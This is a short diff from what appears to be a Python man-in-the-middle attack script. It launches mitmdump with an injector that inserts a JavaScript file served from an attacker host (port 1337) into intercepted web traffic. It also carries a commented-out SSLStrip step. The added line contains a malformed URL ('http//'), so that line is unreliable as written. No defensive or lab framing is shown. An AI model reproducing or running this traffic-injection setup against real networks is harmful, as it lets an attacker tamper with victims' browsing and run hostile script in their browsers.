@@ -54,5 +54,5 @@ print("HTTP Server Run")
 #print("SSLStrip Run")
 
 # start the mitmproxy
-os.system("~/.local/bin/mitmdump -s 'new_injector.py http://192.168.0.14:1337/script.js' -T")
+os.system("/usr/bin/mitmdump -s 'injector.py http//172.16.96.131:1337/script.js' -T")
 print("MITMProxy Run")
